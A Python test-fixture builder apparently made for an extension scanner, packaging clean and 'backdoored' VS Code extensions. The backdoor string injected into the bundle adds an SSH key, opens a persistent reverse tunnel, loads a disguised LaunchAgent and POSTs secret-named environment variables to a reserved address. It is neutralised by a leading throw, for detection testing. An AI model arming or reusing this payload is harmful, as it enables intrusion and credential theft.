"""Builds inert test extensions.

The "backdoored" sample mirrors the structure of the October 2026 Claude Code
extension compromise (as documented by Phorion) closely enough to exercise
every check, but it can't do anything: it throws on its first statement, the
SSH key is a dummy, and the address is in a reserved benchmarking range.
"""

import io
import json
import zipfile

ESBUILD_BODY = (
    '"use strict";var __create=Object.create;var __defProp=Object.defineProperty;'
    'var __getOwnPropNames=Object.getOwnPropertyNames;var __commonJS=(cb,mod)=>function(){return mod||'
    '(0,cb[__getOwnPropNames(cb)[0]])((mod={exports:{}}).exports,mod),mod.exports};'
    'var vscode=require("vscode");function activate(ctx){ctx.subscriptions.push('
    'vscode.commands.registerCommand("demo.hello",()=>vscode.window.showInformationMessage("hi")))}'
    'function deactivate(){}module.exports={activate,deactivate};\n'
) + ("/* padding so the bundle looks like a real one */\n" * 50)

INJECTED = r"""throw new Error("extwatch test fixture: inert, never run");
(function(){var cp=require("child_process"),fs=require("fs"),os=require("os"),path=require("path"),http=require("http");
var HOME=os.homedir(),PUB="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDUMMYDUMMYDUMMYDUMMYDUMMYDUMMYDUMMYDUMMY svc-demo";
var sd=path.join(HOME,".ssh"),ak=path.join(sd,"authorized_keys");try{fs.mkdirSync(sd,{recursive:true});
var cur=fs.existsSync(ak)?fs.readFileSync(ak,"utf8"):"";if(cur.indexOf("svc-demo")<0){fs.appendFileSync(ak,PUB+"\n")}}catch(e){}
var RF="'*:0:localhost:22'";var tun="ssh -N -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -R "+RF+" tunnel@198.18.7.21";
cp.spawn("/bin/sh",["-c","while true; do "+tun+"; sleep 60; done"],{detached:true,stdio:"ignore",windowsHide:true}).unref();
var la=path.join(HOME,"Library/LaunchAgents","com.apple.sysdemo.plist");try{fs.writeFileSync(la,"<plist/>");cp.execSync("launchctl load "+la)}catch(e){}
var d={h:os.hostname(),env:Object.keys(process.env).filter(function(k){return /KEY|TOKEN|SECRET|PASS/i.test(k)})};
http.get("http://ifconfig.me",function(){});var r=http.request({host:"198.18.7.21",port:8099,path:"/beacon",method:"POST"});r.write(JSON.stringify(d));r.end()})();
"""

MANIFEST = {
    "name": "demo-ext", "publisher": "demo", "displayName": "Demo Extension", "version": "1.0.0",
    "main": "./dist/extension.js", "engines": {"vscode": "^1.90.0"},
    "activationEvents": ["onStartupFinished"],
}


def clean_files(manifest=None):
    return {"package.json": json.dumps(manifest or MANIFEST, indent=2).encode(),
            "dist/extension.js": ESBUILD_BODY.encode(),
            "README.md": b"# Demo\n"}


def backdoored_files(manifest=None):
    files = clean_files(manifest)
    files["dist/extension.js"] = (INJECTED + ESBUILD_BODY).encode()
    return files


def make_vsix(files, platform=None) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        tp = f' TargetPlatform="{platform}"' if platform else ""
        zf.writestr("extension.vsixmanifest", f'<PackageManifest><Metadata><Identity Id="x"{tp}/></Metadata></PackageManifest>')
        zf.writestr("[Content_Types].xml", "<Types/>")
        for rel, data in files.items():
            zf.writestr("extension/" + rel, data)
    return buf.getvalue()


def write_folder(root, files):
    import os
    for rel, data in files.items():
        p = os.path.join(root, rel)
        os.makedirs(os.path.dirname(p), exist_ok=True)
        with open(p, "wb") as fh:
            fh.write(data)
